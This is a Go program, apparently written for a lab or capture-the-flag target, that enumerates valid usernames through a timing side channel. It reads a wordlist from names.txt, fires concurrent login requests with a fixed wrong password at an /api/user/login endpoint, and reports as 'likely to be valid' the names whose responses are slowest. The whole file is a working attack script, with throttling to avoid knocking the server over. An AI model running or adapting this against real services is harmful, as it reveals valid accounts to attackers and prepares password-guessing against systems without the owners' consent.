package main

import (
	"bufio"
	"encoding/json"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

var (
	usernameChan chan string
	resultsChan   chan result
)

type login struct {
	Username string `json:"username"`
	Password string `json:"password"`
}
type result struct {
	username string
	time     int64
}

func main() {
	var usernameSlice []string
	var resultsSlice []result
	file, err := os.Open("names.txt")
	if err != nil {
		log.Fatalln(err)
	}
	defer file.Close()

	//Create a reader and read usernames in
	scanner := bufio.NewScanner(file)
	for scanner.Scan() { //Build wordlist as a Slice (array)
		usernameSlice = append(usernameSlice, 
			strings.TrimSuffix(scanner.Text(),
			"\n"))
	}

	//Create buffers/channels for threads
	bufSize := len(usernameSlice)
	usernameChan = make(chan string, bufSize)
	resultsChan = make(chan result, bufSize)
	log.Println("Usernames buffered, sending requests")

	for i:=0;i<bufSize;i++ { //Send the work to each thread
		usernameChan <- usernameSlice[i]
		//Back off every 50 requests, otherwise you *WILL* DoS the server
		if i % 50 == 0 {time.Sleep(time.Millisecond*200)}
		go doAndtimeRequest(<- usernameChan)
	}
	log.Println("Work sent")

	for i:=0;i<bufSize;i++ { //Retrieve results from each thread
		var res result
		res = <- resultsChan
		resultsSlice = append(resultsSlice, res)
	}
	log.Println("Work completed")

	max := findMax(resultsSlice)
	findValidUsernames(resultsSlice,max)
}

func findValidUsernames(res []result, max int64) { //using the max time, find times within 10% of this and print unames
	threshold := 0.9 * float64(max)
	for _, val := range res {
		if float64(val.time) > threshold {
			log.Println(val.username, "is likely to be valid")
		}
	}
}

func findMax(res []result) int64 {
	max := int64(0)
	for _, val := range res {
		if val.time > max {
			max = val.time
		}
	}
	return max
}

func doAndtimeRequest(username string) {
	start := time.Now()
	doLoginPOST(username)
	end := time.Now()
	res := result{username: username, time: end.Sub(start).Nanoseconds()}
	resultsChan <- res
}

func doLoginPOST(username string) { //This performs the API POST request
	jsonStr, err := json.Marshal(login{Username: username, Password: "invalidPassword1"})
	if err != nil {
		log.Println(err.Error())
	}
	reader := strings.NewReader(string(jsonStr))
	resp, _ := http.Post("http://10.10.229.108:80/api/user/login", "application/json", reader)
	resp.Body.Close()
}